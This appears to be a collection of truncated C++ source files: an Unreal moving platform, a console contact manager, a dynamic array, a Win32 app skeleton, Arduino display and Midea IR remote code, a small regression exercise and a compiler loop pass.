    "#include \"MovingPlatform.h\"\n\n/* Sets default values */\nAMovingPlatform::AMovingPlatform()\n{\n \t// Set this actor to call Tick() every frame\n\tPrimaryActorTick.bCanEverTick = true;\n}\n\n/* Called when the game starts or when spawned */\nvoid AMovingPlatform::BeginPlay()\n{\n\tSuper::BeginPlay();\n\tStartLocation = GetActorLocation();\n\tFString Name = GetName();\n\tUE_LOG(LogTemp, Display, TEXT(\"BeginPlay: %s\"), *Name);\n}\n\n/* Called every frame */\nvoid AMovingPlatform::Tick(float DeltaTime)\n{\n\tSuper::Tick(DeltaTime);\n\tMovePlatform(DeltaTime);\n\tRotatePlatform(DeltaTime);\n}\n\n/* To move the platform */\nvoid AMovingPlatform::MovePlatform(float DeltaTime)\n{\n\t// Send platform back if gone too far\n\tif (ShouldPlatformReturn())\n\t{\n\t\tFVector MoveDirection = PlatformVelocity.GetSafeNormal();\n\t\tStartLocation = StartLocation + MoveDirection * MoveDistance;\n\t\tSetActorLocation(StartLocation);\n\t\tPlatformVelocity = -PlatformVelocity;\n\t}\n\t// Move platform forwards\n\telse\n\t{\n\t\tFVector CurrentLocation = GetActorLocation();\n\t\tCurrentLocation = CurrentLocation + PlatformVelocity * DeltaTime;\n\t\tSetActorLocation(CurrentLocation);\n\t}\n}\n\n/* To rotate the platform */\nvoid AMovingPlatform::RotatePlatform(float DeltaTime) \n{\n\tAddActorLocalRotation(RotationVelocity * DeltaTime);\n}\n\n/* Check if the platform should return or not */\nbool AMovingPlatform::ShouldPlatformReturn() const\n{\n\treturn GetDistanceMoved() > MoveDistance;\n}\n\n/* Return the current distance moved */\nfloat AMovingPlatform::GetDistanceMoved() const\n{\n\treturn FVector::Dist(StartLocation, GetActorLocation());\n}\n",
    "#include <iostream>\n#include <fstream>\n#include <cstdlib>\n#include <conio.h>\n#include <algorithm>\n#include <string>\n#include <iomanip>  // For formatting output\n\nusing namespace std;\n\n// Node structure for a contact\nstruct ContactNode {\n    string firstName;\n    string lastName;\n    string phoneNumber;\n    string email;\n    ContactNode* next;\n};\n\n// Function declarations\nvoid addContact();\nvoid searchContact();\nvoid displayContacts();\nvoid editContact();\nvoid deleteContact();\nvoid selfExit();\nvoid displayMenu();\nbool checkDigits(const string&);\nbool checkNumbers(const string&);\nvoid binarySearchByName(const string&);\nvoid searchByPhoneNumber(const string&);\nint hashFunction(const string&);\nvoid sortContacts();\nvoid importContactsFromFile();\nvoid exportContactsToFile();\n\n\n\n\n// Global variables\nContactNode* contactList = nullptr;\nconst int hashTableSize = 26;\nContactNode* hashTable[hashTableSize] = {nullptr};\n\nint main() {\n    short int choice;\n\n    do {\n        system(\"cls\");\n        system(\"color 0A\");\n        displayMenu();\n        cin >> choice;\n\n        switch (choice) {\n            case 1:\n                addContact();\n                break;\n            case 2:\n                searchContact();\n                break;\n            case 3:\n                displayContacts();\n                break;\n            case 4:\n                editContact();\n                break;\n            case 5:\n                deleteContact();\n                break;\n            case 6:\n                sortContacts();\n                break;\n            case 7:\n                exportContactsToFile();\n                break;\n            case 8:\n                importContactsFromFile();\n                break;\n            case 9:\n                selfExit();\n                break;\n            default:\n                cout << \"\\n\\n\\tInvalid Input!\";\n                cout << \"\\n\\tPress Any Key To Continue..\";\n                getch();\n        }\n\n     } while (choice != 9);\n\n    return 0;\n}\n\n\nvoid selfExit() {\n   exit(0);\n}\n\nvoid addContact() {\n    system(\"cls\");\n    cout << \"\\n\\n\\t\\tAdd a New Contact\\n\";\n\n    string fname, lname, phoneNum, email;\n\n    cout << \"\\n\\tEnter First Name : \";\n    cin >> fname;\n\n    // Check if the first name is empty or contains spaces\n    if (fname.empty() || fname.find(' ') != string::npos) {\n        cout << \"\\n\\tInvalid First Name!\";\n        cout << \"\\n\\tPress Any Key To Continue..\";\n        getch();\n        return;\n    }\n\n    cout << \"\\tEnter Last Name  : \";\n    cin >> lname;\n\n    // Check if the last name is empty or contains spaces\n    if (lname.empty() || lname.find(' ') != string::npos) {\n        cout << \"\\n\\tInvalid Last Name!\";\n        cout << \"\\n\\tPress Any Key To Continue..\";\n        getch();\n        return;\n    }\n\n    // Check if the first and last name are the same\n    if (fname == lname) {\n        cout << \"\\n\\tFirst Name and Last Name cannot be the same!\";\n        cout << \"\\n\\tPress Any Key To Continue..\";\n        getch();\n        return;\n    }\n\n    cout << \"\\tEnter Phone Number : \";\n    cin >> phoneNum;\n    cout << \"\\tEnter Email      : \";\n    cin >> email;\n\n    if (checkDigits(phoneNum) && checkNumbers(phoneNum)) {\n        // Create a new contact node\n        ContactNode* newContact = new ContactNode{fname, lname, phoneNum, email, nullptr};\n\n        // Add the new contact to the linked list\n        if (contactList == nullptr) {\n            contactList = newContact;\n        } else {\n            ContactNode* current = contactList;\n            while (current->next != nullptr) {\n                current = current->next;\n            }\n            current->next = newContact;\n        }\n\n        // Add the new contact to the hash table\n        int hashValue = hashFunction(fname);\n        if (hashTable[hashValue] == nullptr) {\n            hashTable[hashValue] = newContact;\n        } else {\n            newContact->next = hashTable[hashValue];\n            hashTable[hashValue] = newContact;\n        }\n\n        cout << \"\\n\\tContact Saved Successfully!\";\n    } else {\n        cout << \"\\n\\tInvalid Phone Number!\";\n    }\n\n    cout << \"\\n\\tPress Any Key To Continue..\";\n    getch();\n}\n\n\n\nvoid searchContact() {\n    system(\"cls\");\n    int searchChoice;\n    cout << \"\\n\\tSearch Contact By:\\n\\t1. Name\\n\\t2. Phone Number\\n\\t3. Back\\n\\t> \";\n    cin >> searchChoice;\n\n    switch (searchChoice) {\n        case 1:\n            {\n                string keyword;\n                cout << \"\\n\\tEnter Name To Search : \";\n                cin.ignore();  // Ignore the newline character in the buffer\n                getline(cin, keyword);\n                binarySearchByName(keyword);\n            }\n            break;\n        case 2:\n            {\n                string phoneNumber;\n                cout << \"\\n\\tEnter Phone Number To Search : \";\n                cin >> phoneNumber;\n                searchByPhoneNumber(phoneNumber);\n            }\n            break;\n        case 3:\n            return;  // Go back to the main menu\n        default:\n   ",
    "#include <iostream>\nusing namespace std;\n\n#define GROWTH_FACTOR 2\n\ntemplate <typename T>\nclass DynamicArray {\nprivate:\n\tT* array;\n\tsize_t size;\n\tsize_t cursor;\n\npublic:\n\tDynamicArray(size_t size = 16) {\n\t\tthis->array = new T[size];\n\t\tthis->size= size;\n\t\tthis->cursor= 0; // initiating cursor to 0\n\t};\n\n\n\tT operator[](int i) {\n\t\tif (i < size - 1) {\n\t\t\tcout << array[i] << endl;\n\t\t\treturn this->array[i];\n\t\t}\n\n\t\telse {\n\t\t\tcout << \"so you want element number \" << i << \"but we only have \" << this->size << endl;\n\t\t\treturn (T) 0;\n\t\t}\n\t}\n\n\tbool add(T value) {\n\t\tif (cursor < size - 1) {\n\t\t\tthis->array[cursor] = value;\n\t\t\tthis->cursor++;\n\n\t\t\treturn true;\n\t\t}\n\t\telse {\n\t\t\tcout << \"resizing at: cursor = \" << this->cursor << endl;\n\t\t\t// resizing the array\n\t\t\tsize_t newSize = this->size * GROWTH_FACTOR;\n\t\t\tT* newArray = new T[newSize];\n\t\t\t// moving the old array to the newer one\n\t\t\tfor (size_t i = 0; i < this->size; i++) {\n\t\t\t\tnewArray[i] = this->array[i];\n\t\t\t}\n\t\t\tdelete this->array;\n\t\t\tthis->array = newArray;\n\n\t\t\tthis->size = newSize;\n\t\t\t// adding the value to the new array:\n\t\t\tthis->add(value);\n\t\t\treturn false;\n\t\t}\n\t}\n\n\tvoid printAll() {\n\t\tfor (size_t i = 0; i < this->cursor; i++)\n\t\t\tcout << this->array[i] << endl;\n\t}\n};\n\n\nint main() {\n\n\tDynamicArray<int> b;\n\t\n\n\tfor (size_t i = 0; i < 256; i++) {\n\t\tb.add(i);\n\t}\n\n\tb.printAll();\n\n\n\treturn EXIT_SUCCESS;\n}",
    "// VeilPNG.cpp : Defines the entry point for the application.\n//\n\n#include \"framework.h\"\n#include \"VeilPNG.h\"\n\n#define MAX_LOADSTRING 100\n\n// Global Variables:\nHINSTANCE hInst;                                // current instance\nWCHAR szTitle[MAX_LOADSTRING];                  // The title bar text\nWCHAR szWindowClass[MAX_LOADSTRING];            // the main window class name\n\n// Forward declarations of functions included in this code module:\nATOM                MyRegisterClass(HINSTANCE hInstance);\nBOOL                InitInstance(HINSTANCE, int);\nLRESULT CALLBACK    WndProc(HWND, UINT, WPARAM, LPARAM);\nINT_PTR CALLBACK    About(HWND, UINT, WPARAM, LPARAM);\n\nint APIENTRY wWinMain(_In_ HINSTANCE hInstance,\n                     _In_opt_ HINSTANCE hPrevInstance,\n                     _In_ LPWSTR    lpCmdLine,\n                     _In_ int       nCmdShow)\n{\n    UNREFERENCED_PARAMETER(hPrevInstance);\n    UNREFERENCED_PARAMETER(lpCmdLine);\n\n    // TODO: Place code here.\n\n    // Initialize global strings\n    LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);\n    LoadStringW(hInstance, IDC_VEILPNG, szWindowClass, MAX_LOADSTRING);\n    MyRegisterClass(hInstance);\n\n    // Perform application initialization:\n    if (!InitInstance (hInstance, nCmdShow))\n    {\n        return FALSE;\n    }\n\n    HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_VEILPNG));\n\n    MSG msg;\n\n    // Main message loop:\n    while (GetMessage(&msg, nullptr, 0, 0))\n    {\n        if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg))\n        {\n            TranslateMessage(&msg);\n            DispatchMessage(&msg);\n        }\n    }\n\n    return (int) msg.wParam;\n}\n\n\n\n//\n//  FUNCTION: MyRegisterClass()\n//\n//  PURPOSE: Registers the window class.\n//\nATOM MyRegisterClass(HINSTANCE hInstance)\n{\n    WNDCLASSEXW wcex;\n\n    wcex.cbSize = sizeof(WNDCLASSEX);\n\n    wcex.style          = CS_HREDRAW | CS_VREDRAW;\n    wcex.lpfnWndProc    = WndProc;\n    wcex.cbClsExtra     = 0;\n    wcex.cbWndExtra     = 0;\n    wcex.hInstance      = hInstance;\n    wcex.hIcon          = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_VEILPNG));\n    wcex.hCursor        = LoadCursor(nullptr, IDC_ARROW);\n    wcex.hbrBackground  = (HBRUSH)(COLOR_WINDOW+1);\n    wcex.lpszMenuName   = MAKEINTRESOURCEW(IDC_VEILPNG);\n    wcex.lpszClassName  = szWindowClass;\n    wcex.hIconSm        = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));\n\n    return RegisterClassExW(&wcex);\n}\n\n//\n//   FUNCTION: InitInstance(HINSTANCE, int)\n//\n//   PURPOSE: Saves instance handle and creates main window\n//\n//   COMMENTS:\n//\n//        In this function, we save the instance handle in a global variable and\n//        create and display the main program window.\n//\nBOOL InitInstance(HINSTANCE hInstance, int nCmdShow)\n{\n   hInst = hInstance; // Store instance handle in our global variable\n\n   HWND hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW,\n      CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr);\n\n   if (!hWnd)\n   {\n      return FALSE;\n   }\n\n   ShowWindow(hWnd, nCmdShow);\n   UpdateWindow(hWnd);\n\n   return TRUE;\n}\n\n//\n//  FUNCTION: WndProc(HWND, UINT, WPARAM, LPARAM)\n//\n//  PURPOSE: Processes messages for the main window.\n//\n//  WM_COMMAND  - process the application menu\n//  WM_PAINT    - Paint the main window\n//  WM_DESTROY  - post a quit message and return\n//\n//\nLRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)\n{\n    switch (message)\n    {\n    case WM_COMMAND:\n        {\n            int wmId = LOWORD(wParam);\n            // Parse the menu selections:\n            switch (wmId)\n            {\n            case IDM_ABOUT:\n                DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About);\n                break;\n            case IDM_EXIT:\n                DestroyWindow(hWnd);\n                break;\n            default:\n                return DefWindowProc(hWnd, message, wParam, lParam);\n            }\n        }\n        break;\n    case WM_PAINT:\n        {\n            PAINTSTRUCT ps;\n            HDC hdc = BeginPaint(hWnd, &ps);\n            // TODO: Add any drawing code that uses hdc here...\n            EndPaint(hWnd, &ps);\n        }\n        break;\n    case WM_DESTROY:\n        PostQuitMessage(0);\n        break;\n    default:\n        return DefWindowProc(hWnd, message, wParam, lParam);\n    }\n    return 0;\n}\n\n// Message handler for about box.\nINT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)\n{\n    UNREFERENCED_PARAMETER(lParam);\n    switch (message)\n    {\n    case WM_INITDIALOG:\n        return (INT_PTR)TRUE;\n\n    case WM_COMMAND:\n        if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL)\n        {\n            EndDialog(hDlg, LOWORD(wParam));\n            return (INT_PTR)TRUE;\n        }\n        break;\n    }\n    return (INT_PTR)FALSE;\n}\n",
    "#include \"display.h\" // Functions related to display control\n#include <Arduino.h> // Arduino core library\n\nextern int latchPin; // Latch pin for the shift register\nextern int clockPin; // Clock pin for the shift register\nextern int dataPin; // Data pin for the shift register\nextern byte sevenSegDigits[]; // Array for the 7-segment display numbers\n\n////////// DISPLAY INITIALIZATION //////////\nvoid initializeDisplay(void) {\n    pinMode(latchPin, OUTPUT); // Set latch pin to output mode\n    pinMode(clockPin, OUTPUT); // Set clock pin to output mode\n    pinMode(dataPin, OUTPUT); // Set data pin to output mode\n    digitalWrite(latchPin, LOW);  // Ensure that output is LOW at the start\n}\n\n////////// DISPLAY UPDATE //////////\nvoid updateShiftRegister(int tensDigit, int onesDigit, bool showDots, int hundreds) {\n    digitalWrite(latchPin, LOW); // Prepare to send data to the shift register\n\n    byte onesSegment = sevenSegDigits[onesDigit]; // Get value for the right segment\n    byte tensSegment = sevenSegDigits[tensDigit]; // Get value for the left segment\n\n    // If dots should be shown in high score condition\n    if (showDots) {\n        onesSegment |= B10000000;  // Turn on the dot for the right segment\n        tensSegment |= B10000000;  // Turn on the dot for the left segment\n    }\n\n    // Add logic for indicating hundreds exceeded\n    if (hundreds == 1) {\n        onesSegment |= B10000000;  // Turn on the dot for the right segment\n    } else if (hundreds >= 2) {\n        onesSegment |= B10000000;  // Turn on the dot for the right segment\n        tensSegment |= B10000000;  // Turn on the dot for the left segment\n    }\n\n    // Shift the segment values into the shift register\n    shiftOut(dataPin, clockPin, MSBFIRST, onesSegment);  // Send the right number\n    shiftOut(dataPin, clockPin, MSBFIRST, tensSegment);  // Send the left number\n\n    digitalWrite(latchPin, HIGH); // Lock the data into the shift register and update the display\n}\n\n////////// CLEAR DISPLAY //////////\nvoid clearDisplay() {\n    digitalWrite(latchPin, LOW); // Prepare to send data to the shift register\n\n    // Send zeros to both segments\n    shiftOut(dataPin, clockPin, MSBFIRST, 0x00);  // Clear the right number\n    shiftOut(dataPin, clockPin, MSBFIRST, 0x00);  // Clear the left number\n\n    digitalWrite(latchPin, HIGH); // Lock the data and clear the display\n}\n",
    "\n\n#include <iostream>\n#include <cmath>\nint Weight(int Grandezze[3],int pesi[3],float& weight,float& mediaY,int& mediaX){\n    \n    float calcoloTotX,calcoloTotY,calcoloTot;\n    float sommaX, sommaY = 0;\n    //x\n    for(int i = 0; i < 3;i++){\n        sommaX+= Grandezze[i];\n        mediaX = (sommaX)/3;\n\n    }\n    //y\n    for(int i = 0; i < 3;i++){\n        sommaY += pesi[i];\n        mediaY = (sommaY)/3;\n    }\n    //(xi-x)(yi-y)\n    int abc = 0;\n    for(int i = 0; i <= 2; i++){\n        calcoloTotX = (Grandezze[i]-mediaX);\n        calcoloTotY = (pesi[i]-mediaY);\n\n        calcoloTot += calcoloTotX*calcoloTotY;\n        abc+=calcoloTotX*calcoloTotX;\n    }\n    //risultato\n    weight = calcoloTot/abc;\n    return weight;\n}\n\n\nfloat bias(int Grandezze[3],int pesi[3]){\n    float weight;\n    float a,b;\n    float mediaY;\n    int mediaX;\n    float bias = 0;\n    Weight(Grandezze, pesi, weight,mediaY,mediaX);\n    bias = mediaY - (weight*mediaX);\n    return bias;\n}\n\n\n\nint main(int argc, const char * argv[]) {\n    int Grandezze[3] = {1,2,3};\n    int pesi[3] = {2,3,5};\n    int dataSum = 0;\n    \n    float weight,mediaY,b;\n    int mediaX;\n    Weight(Grandezze, pesi, weight, mediaY, mediaX);\n    b = bias(Grandezze, pesi);\n    int x;\n    float DataTest = 0;\n    float MSE = 0;\n    for(int i = 0; i < 3; i++){\n        DataTest = weight*Grandezze[i]+b;\n        MSE += pow(pesi[i]-DataTest, 2);\n    }\n    \n    MSE = MSE/3;\n    std::cout << \"inserisci grandezza\" << std::endl;\n    std::cin>> x;\n    std::cout << weight*x+b << std::endl;\n    std::cout << \"errore medio: \" << MSE << std::endl;\n}\n",
    "#include \"LoopConstruct.h\"\n#include <algorithm>\n#include <vector>\n#include <string>\nusing namespace std;\n\nvoid LoopConstructPass::Run(){\n    loop_construct();\n\n    // printInfo(); // just for testing\n}\n\nvoid LoopConstructPass::loop_construct(){\n    for(auto iter = pFT->begin(); iter != pFT->end(); iter++){\n        Loop *rootLoop = collectLoop(iter->second);\n\n        unordered_set<BasicBlock *> visited;\n        buildLoopTree(rootLoop, visited);\n    }\n}\n\nLoop *LoopConstructPass::collectLoop(FuncModule *FM){\n    FM->Loops.clear();\n    for(auto iter = FM->BBs.begin(); iter != FM->BBs.end(); iter++){\n        (*iter)->LoopStartWith.clear();\n    } // updating may be necessary\n\n    Loop *RootLoop = new Loop(\"LOOP\" + to_string(++LOOP_COUNT), FM->entry(), FM->real_exit, FM);\n    RootLoop->isRoot = true;\n    RootLoop->layer = 0;\n    for(auto iter = FM->BBs.begin(); iter != FM->BBs.end(); iter++){\n        if(*iter != FM->entry()){RootLoop->addBB(*iter);}\n    }\n    FM->entry()->addLoop(RootLoop);\n\n    for(auto iter = FM->BBs.begin(); iter != FM->BBs.end(); iter++){\n        for(auto iter1 = (*iter)->precBB.begin(); iter1 != (*iter)->precBB.end(); iter1++){\n            if((*iter)->Doms.count(*iter1)){\n                Loop *loop = new Loop(\"LOOP\" + to_string(++LOOP_COUNT), *iter, *iter1, FM);\n                (*iter)->addLoop(loop);\n                FM->addLoop(loop);\n                DFS4collectLoop(*iter1, loop);\n                loop->bbSet.erase(*iter1); // bbSet doesn't include tail\n            }\n        }\n    }\n\n    return RootLoop;\n}\n\nvoid LoopConstructPass::DFS4collectLoop(BasicBlock *bb, Loop *loop){\n    if(bb == loop->head){return;}\n    loop->addBB(bb);\n    for(auto iter = bb->precBB.begin(); iter != bb->precBB.end(); iter++){\n        if(!loop->bbSet.count(*iter) && !bb->Doms.count(*iter)){\n            DFS4collectLoop(*iter, loop);\n        }\n    }\n}\n\nvoid LoopConstructPass::buildLoopTree(Loop *loop, unordered_set<BasicBlock *>& visited){\n    BasicBlock *head = loop->head, *tail = loop->tail;\n    head->loop_depth = max(loop->layer, head->loop_depth);\n    if(!visited.count(head)){visited.insert(head);}\n\n    reverse(loop->bbRPO.begin(), loop->bbRPO.end());\n    vector<BasicBlock *>& worklist = loop->bbRPO; // bbs in loop with top-order\n\n    for(int i = 0; i < worklist.size(); i++){\n        BasicBlock *bb = worklist[i];\n        if(visited.count(bb)){continue;}\n        bb->loop_depth = max(loop->layer, bb->loop_depth);\n\n        for(auto iter = bb->LoopStartWith.begin(); iter != bb->LoopStartWith.end(); iter++){\n            loop->addChild(*iter);\n            (*iter)->setParent(loop);\n            (*iter)->layer = loop->layer + 1;\n            buildLoopTree(*iter, visited);\n        }\n\n        if(!visited.count(bb)){visited.insert(bb);}\n    }\n}\n\n/* func for testing */\nvoid LoopConstructPass::printInfo(){\n    for(auto iter = pFT->begin(); iter != pFT->end(); iter++){\n        for(auto iter1 = (iter->second)->Loops.begin(); iter1 != (iter->second)->Loops.end(); iter1++){\n            (*iter1)->Print();\n        }\n    }\n}",
    "/*\n * \u7f8e\u7684\u7a7a\u8c03\u9065\u63a7\u5668RN02S13\u7ea2\u5916\u53d1\u5c04\u63a7\u5236\u5e93\uff0c\u9700\u914d\u5408IRremoteESP8266\u5e93\u4f7f\u7528\u3002\n * \u53ef\u4ee5\u63a7\u5236\u7684\u53c2\u6570\uff1a\u6e29\u5ea6\uff08\u7cbe\u786e\u52300.5\uff09\uff0c\u6a21\u5f0f\uff0c\u98ce\u901f\uff0c\u5f00\u5173\u673a\uff0c\u5b9a\u65f6\uff0c\u626b\u98ce\uff0cECO\uff0c\u9632\u76f4\u5439\u3002\n * \u4f5c\u8005\uff1a\u5149\u9634\u4f3c\u6c341204\n * \u4e86\u89e3\u66f4\u591a\u8bf7\u8bbf\u95eewww.songzx.top\n * \u65f6\u95f4\uff1a2021\u5e749\u670817\u65e5\n */\n#include <Arduino.h>\n#include \"IRsendMeidi.h\"\n#include <IRremoteESP8266.h>\n#include <IRsend.h>\nint ZBPL = 38;         //\u8bbe\u7f6e\u7ea2\u5916\u53d1\u5c04\u8f7d\u6ce2\u9891\u7387\u9ed8\u8ba4\u503c\uff0c\u5355\u4f4dkHz\nfloat Temps = 26;      //\u8bbe\u7f6e\u6e29\u5ea6\u9ed8\u8ba4\u503c\uff0c17-30,\u5206\u8fa8\u73870.5\nint Modes = 0;         //\u8bbe\u7f6e\u6a21\u5f0f\u9ed8\u8ba4\u503c\uff0c0\u81ea\u52a8\uff0c1\u5236\u51b7\uff0c2\u5236\u70ed\uff0c3\u62bd\u6e7f\uff0c4\u9001\u98ce\nint FanSpeeds = 0;     //\u8bbe\u7f6e\u98ce\u901f\u9ed8\u8ba4\u503c\uff0c0\u81ea\u52a8\uff0c1\u4e3a20%\uff0c2\u4e3a40%\uff0c3\u4e3a60%\uff0c4\u4e3a80%\uff0c5\u4e3a100%\nbool Temp01 = 0;       //\u8bbe\u7f6e\u9ed8\u8ba4\u53d1\u5c04\u6e29\u5ea6\u5c0f\u6570\u4f4d\uff0c1\u4e3a0.5,0\u4e3a0\nint Marks = 500;       //\u6807\u8bb0\u4f4d\u65f6\u95f4\u5355\u4f4dus\nint One_Space = 1600;  //1\u4f4d\u9ad8\u7535\u5e73\u65f6\u95f4\nint Zero_Space = 550;  //0\u4f4d\u9ad8\u7535\u5e73\u65f6\u95f4\nint L_Mark = 4400;     //\u5f15\u5bfc\u4f4d\u4f4e\u7535\u5e73\u65f6\u95f4\nint L_Space = 4400;    //\u5f15\u5bfc\u4f4d\u9ad8\u7535\u5e73\u65f6\u95f4\nint S_Space = 5220;    //\u95f4\u9694\u4f4d\u9ad8\u7535\u5e73\u65f6\u95f4\nuint8_t D_1 = 0xAB, D_2 = 0x66, D_3 = 0x00, D_4 = 0x00, D_5 = 0x00, D_6 = 0xDC;\nuint8_t A,B,C,B_1 = 0xF, B_2, C_1 = 0x1, C_2 = 0xB;\nuint8_t kIrLed = 4;  // ESP8266 GPIO pin to use. Recommended: 4 (D2).\n\nIRsend irsend(kIrLed);  // Set the GPIO to be used to sending the message.\n\nvoid Lead_Code();       //\u5b9a\u4e49\u5f15\u5bfc\u7801\u53d1\u9001\u51fd\u6570\nvoid Stop_Code();       //\u5b9a\u4e49\u5206\u9694\u7801\u53d1\u9001\u51fd\u6570\nvoid Send_Byte(uint8_t data1, int nbit1, bool msb);   //\u5b9a\u4e49\u53d1\u9001\u539f\u59cb\u6570\u636e\u7684\u51fd\u6570\uff0cdata1(\u6570\u636e\uff09\uff0cnbit1(\u6570\u636e\u4e8c\u8fdb\u5236\u4f4d\u6570\uff09\uff0cmsb(\u6570\u636e\u53d1\u9001\u987a\u5e8f\uff0c1\u4e3a\u4f4e\u4f4d\u5148\u53d1\uff0c0\u4e3a\u9ad8\u4f4d\u5148\u53d1\uff09\n\nvoid Send_Code_S(uint8_t A, uint8_t B, uint8_t C, uint8_t D_1, uint8_t D_2,  uint8_t D_3, uint8_t D_4, uint8_t D_5, uint8_t D_6);\n//\u5b9a\u65f6\u7528\u7684\u6570\u636e\u53d1\u9001\u51fd\u6570\uff0c\u56e0\u4e3a\u5b9a\u65f6\u53d1\u9001\u7684\u6570\u636eC\u7801\u7684\u53cd\u7801\u4f4d\u7f6e\u4e3a\u56fa\u5b9a\u768411111111\uff0c\u6240\u4ee5\u5f15\u5165\u8be5\u51fd\u6570\uff0cC\u7684\u53cd\u7801\u4f4d\u7f6e\u4e3a\u56fa\u5b9a\u76840xFF\n\nvoid Send_Code_L(uint8_t A, uint8_t B, uint8_t C, uint8_t D_1, uint8_t D_2,  uint8_t D_3, uint8_t D_4, uint8_t D_5, uint8_t D_6); \n//\u6b63\u5e38\u7684\u53d1\u9001\u6570\u636e\u7684\u51fd\u6570\uff0c\u7528\u6765\u53d1\u9001\u957f\u7801\n\nvoid if_D6(int fs);  //\u8ba1\u7b97\u98ce\u901f\u6570\u636e\u7684\u51fd\u6570\uff0c\u56e0\u4e3a\u98ce\u901f\u6570\u636e\u7684D_6\u548c\u6e29\u5ea6\u662f\u5426\u67090.5\u4f4d\u76f8\u5173\u8054\u3002\n\nvoid Send_Meidi(bool Code_State);  //\u53d1\u9001\u957f\u7801\u6570\u636e\u7684\u51fd\u6570\uff0c1\u4e3a\u6b63\u5e38\u53d1\u9001\uff0c0\u4e3aC\u53cd\u7801\u56fa\u5b9a\u4e3a0xFF\u7684\u53d1\u9001\u3002\n\nvoid IRsendMeidi::begin_2(){   //\u521d\u59cb\u5316IRsend.begin\u7684\u51fd\u6570\uff0c\u9700\u5199\u5165\u5230\u4e3b\u7a0b\u5e8f\u7684void setup\uff08\uff09\u4e2d\u3002\n  irsend.begin();\n}\n\nvoid IRsendMeidi::setCodeTime(int  marks,int one_spaces,int zero_spaces, int l_marks, int l_spaces, int s_spaces){\n   Marks = marks;\n   One_Space = one_spaces;\n   Zero_Space = zero_spaces;\n   L_Mark = l_marks;\n   L_Space = l_spaces;\n   S_Space = s_spaces;\n}\n\n\nIRsendMeidi::IRsendMeidi(uint8_t ir_led){  //\u8fd4\u56de\u53d1\u5c04\u4fe1\u53f7\u7684\u5f15\u811a\n\n  kIrLed = ir_led;\n}\n\nvoid IRsendMeidi::setZBPL(int khz){ //\u5b9a\u4e49\u7ea2\u5916\u53d1\u5c04\u7684\u8f7d\u6ce2\u9891\u7387\n\n  ZBPL = khz;\n}\n\nvoid IRsendMeidi::setTemps(float Temps1){  //\u8bbe\u7f6e\u7a7a\u8c03\u6e29\u5ea6\n\n  Temps = Temps1;\n  int temp2 = floor(Temps);\n  float temp_f = Temps - temp2;\n  if(temp_f == 0.5){\n\t  \n    Temp01 = 1;\n    D_3 = 0x04;\n  \n  }\n  else {\n\t  \n    Temp01 = 0;\n    D_3 = 0x00;\n  }\n  if_D6(FanSpeeds);\n  switch(temp2){\n    case 17: C_2 = 0x0; break;\n    case 18: C_2 = 0x8; break;\n    case 19: C_2 = 0xC; break;\n    case 20: C_2 = 0x4; break;\n    case 21: C_2 = 0x6; break;\n    case 22: C_2 = 0xE; break;\n    case 23: C_2 = 0xA; break;\n    case 24: C_2 = 0x2; break;\n    case 25: C_2 = 0x3; break;\n    case 26: C_2 = 0xB; break;\n    case 27: C_2 = 0x9; break;\n    case 28: C_2 = 0x1; break;\n    case 29: C_2 = 0x5; break;\n    case 30: C_2 = 0xD; break;\n  }\n  Send_Meidi(1);\n}\n\n\n\nvoid IRsendMeidi::setModes(int Modes1){  //\u8bbe\u7f6e\u7a7a\u8c03\u6a21\u5f0f\u3002\n  Modes = Modes1;\n  B_1 = 0xF;\n  switch(Modes){\n    case 0: C_1 = 0x1; B_2 = 0x8; break; //auto\n    case 1: C_1 = 0x0; B_2 = 0xB; break; //cool\n    case 2: C_1 = 0x3; B_2 = 0xB; break; //hot\n    case 3: C_1 = 0x2; B_2 = 0x8; break; //choushi\n    case 4: C_1 = 0x2; B_2 = 0xB; C_2 = 0x7; break; //songfeng\n  }\n  Send_Meidi(1);\n}\n\nvoid IRsendMeidi::setFanSpeeds(int FanSpeeds1){  //\u8bbe\u7f6e\u7a7a\u8c03\u98ce\u901f\u3002\n\n  FanSpeeds = FanSpeeds1;\n  B_1 = 0xF;\n  if_D6(FanSpeeds);\n  Send_Meidi(1);\n}\n\n\nvoid IRsendMeidi::setEco(bool Eco){    //\u5f00\u5173ECO\u6a21\u5f0f\n  if(Eco == 1){\n  Send_Code(0xB9, 0xAF ,0x24);\n  }\n  if(Eco == 0){\n  Send_Code(0xB9, 0xAF ,0xA4);\n  }\n}\n\nvoid IRsendMeidi::setPowers(bool Powers){   //\u5f00\u5173\u7a7a\u8c03\n\n  if(Powers == 1){\n    B_1 = 0xF;\n        setTemps(Temps);    \n  }\n  else{\n  Send_Code(0XB2, 0xDE, 0x07); \n  }\n}\n\nvoid IRsendMeidi::setSwingUD(bool SwingUD){  //\u5f00\u5173\u4e0a\u4e0b\u626b\u98ce\n\n  if(SwingUD == 1){\n    Send_Code(0xB9, 0xAF ,0x20);\n  }\n  if(SwingUD == 0){\n    Send_Code(0xB9, 0xAF ,0xA0);\n  }\n}\n\nvoid IRsendMeidi::setSwingLR(bool SwingLR){   //\u5f00\u5173\u5de6\u53f3\u626b\u98ce\n\n  if(SwingLR == 1){\n    Send_Code(0xB9, 0xAF ,0xE0);\n  }\n  if(SwingLR == 0){\n    Send_Code(0xB9, 0xAF ,0x10);\n  }\n}\n\n\n\nvoid IRsendMeidi::setFZC(bool FZC){    //\u5f00\u5173\u9632\u76f4\u5439\n\n  if(FZC == 1){\n    Send_Code(0xB9, 0xAF ,0xDA);\n  }\n  if(FZC == 0){\n    Send_Code(0xB9, 0xAF ,0x3A);\n  }\n}\n\n\nvoid IRsendMeidi::setTimers(float Timers){    //\u8bbe\u7f6e\u5b9a\u65f6\n\n  uint8_t C_1_t = C_1;\n  int Timers1 = floor(Timers);\n  float Timers_f = Timers - Timers1;\n  